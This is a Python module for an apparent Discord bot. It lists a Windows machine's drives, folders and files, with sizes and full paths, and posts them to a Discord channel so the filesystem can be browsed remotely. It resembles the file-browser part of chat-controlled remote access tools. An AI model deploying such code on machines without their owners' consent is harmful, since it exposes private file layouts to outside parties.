import os
import asyncio
import shutil

def list_drives():
    try:
        drives = []
        if os.name == 'nt':
            for letter in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
                drive = f"{letter}:\\"
                if os.path.exists(drive):
                    total, used, free = shutil.disk_usage(drive)
                    total_gb = total / (1024 ** 3)
                    free_gb = free / (1024 ** 3)
                    drives.append(f"💿 **{drive}\**  `{free_gb:.1f}GB free / {total_gb:.1f}GB total`")
        return drives
    except Exception as e:
        return f"**Error: Listing drives failed** `{e}`"

def format_file_size(size_in_bytes):
    for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
        if size_in_bytes < 1024:
            return f"{size_in_bytes:.2f} {unit}"
        size_in_bytes /= 1024

async def send_large_message(channel, message, delay=3):
    parts = []
    while len(message) > 2000:
        split_index = message[:2000].rfind(" ")
        if split_index == -1:
            split_index = 2000  # If no space is found, just split at 2000

        parts.append(message[:split_index])
        message = message[split_index:]

    parts.append(message)

    for part in parts:
        await channel.send(part)
        await asyncio.sleep(delay)

async def list_directory_contents(bot, CHANNEL_ID, current_dir=None):
    try:
        if current_dir is None:
            drives = list_drives()
            message = "**Drives:**\n" + "\n".join(drives)
            channel = bot.get_channel(CHANNEL_ID)
            await channel.send(message)
            return

        file_list = []
        folder_list = []

        for item in os.listdir(current_dir):
            item_path = os.path.join(current_dir, item)
            if os.path.isdir(item_path):
                folder_list.append(f"📁 **{item}**\n └ `{item_path}`")
            else:
                file_size = format_file_size(os.path.getsize(item_path))
                file_list.append(f"📄 **{item}** ({file_size})\n └ `{item_path}`")

        message = "**Folders**:\n" + "\n".join(folder_list) + "\n\n**Files**:\n" + "\n".join(file_list)

        channel = bot.get_channel(CHANNEL_ID)

        if len(message) > 2000:
            await send_large_message(channel, message, delay=3)
        else:
            await channel.send(message)

    except Exception as e:
        channel = bot.get_channel(CHANNEL_ID)
        await channel.send(f"**Error: Listing directory contents failed** `{e}`")

async def handle_navigation(bot, CHANNEL_ID, path):
    try:
        if os.path.isdir(path):
            await list_directory_contents(bot, CHANNEL_ID, path)
        else:
            channel = bot.get_channel(CHANNEL_ID)
            await channel.send(f"**Error: Invalid path** `{path}`")
    except Exception as e:
        channel = bot.get_channel(CHANNEL_ID)
        await channel.send(f"**Error: Navigation to path failed** `{e}`")
